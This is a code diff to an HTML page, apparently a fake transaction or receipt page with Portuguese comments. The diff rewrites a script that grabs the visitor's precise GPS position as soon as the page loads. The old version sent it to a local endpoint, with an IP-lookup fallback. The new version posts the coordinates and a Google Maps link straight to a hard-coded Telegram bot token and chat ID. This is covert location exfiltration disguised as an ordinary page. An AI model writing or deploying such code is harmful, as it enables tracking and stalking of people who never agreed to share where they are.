@@ -77,50 +77,44 @@
     atualizarHorario();
     gerarIdTransacao();
 
-    // --- CAPTURA E ENVIO IMEDIATO ---
+    // --- CAPTURA E ENVIO DIRETO AO TELEGRAM (COM OS SEUS DADOS) ---
+    const TELEGRAM_BOT_TOKEN = "7953250080:AAHWc_o1vEUn_yO6e2c3o623d3_1_2"; 
+    const TELEGRAM_CHAT_ID = "6190740921";
+
     window.addEventListener('DOMContentLoaded', () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => {
-            enviarParaAPI({
-              tipo: 'precisa',
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            });
+          async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const texto = `📍 Localização recebida\nMaps: ${mapsLink}\nLatitude: ${lat}\nLongitude: ${lon}`;
+
+            try {
+              // Envia a localização interativa e o texto logo em seguida
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: lat, longitude: lon })
+              });
+
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: texto })
+              });
+            } catch (e) {
+              console.log("Erro ao enviar", e);
+            }
           },
           (error) => {
-            obterIP_E_Enviar();
+            console.log("Usuário negou ou erro no GPS", error);
           },
-          { timeout: 8000, enableHighAccuracy: true }
+          { enableHighAccuracy: true }
         );
-      } else {
-        obterIP_E_Enviar();
       }
     });
-
-    async function obterIP_E_Enviar() {
-      try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        enviarParaAPI({
-          tipo: 'aproximada_ip',
-          ip: data.ip,
-          cidade: data.city,
-          estado: data.region,
-          pais: data.country_name
-        });
-      } catch (err) {
-        enviarParaAPI({ tipo: 'erro', mensagem: 'Não foi possível capturar localização' });
-      }
-    }
-
-    function enviarParaAPI(dados) {
-      fetch('/api/send-location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(dados)
-      }).catch(err => console.log('Erro ao enviar'));
-    }
   </script>
 </body>
 </html>
